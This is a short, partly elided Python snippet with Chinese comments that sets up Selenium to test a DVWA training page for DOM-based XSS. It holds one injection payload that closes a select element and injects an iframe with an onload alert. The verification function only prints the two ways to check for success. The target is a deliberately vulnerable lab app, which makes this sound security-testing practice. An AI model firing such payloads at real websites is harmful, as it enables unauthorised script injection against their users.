# python 3.7 （代码看不懂可联系qq: 3109843552 邓女士）
...
test_url = 'http://172.16.110.232/DVWA/vulnerabilities/xss_d/' #被测试的页面url
payloads = ['?default=></option></select><iframe%20onload=alert(/xss/)>'] # payloads字典集合


# 实例化一个chrome浏览器进程
options = webdriver.ChromeOptions()
# options.add_argument("start-maximized") #窗口尺寸最大化
...
# 验证 xss dom漏洞 是否被成功利用
def proof_of_concept():
    print('这里是验证payload是否被成功执行的代码。 有两种方案： ')
    print('一是判断弹窗是否成功弹出，弹出了就可以认为存在dom xss漏洞。')
    print('二是看被测试的页面html重新加载后payload代码是否被成功插入')
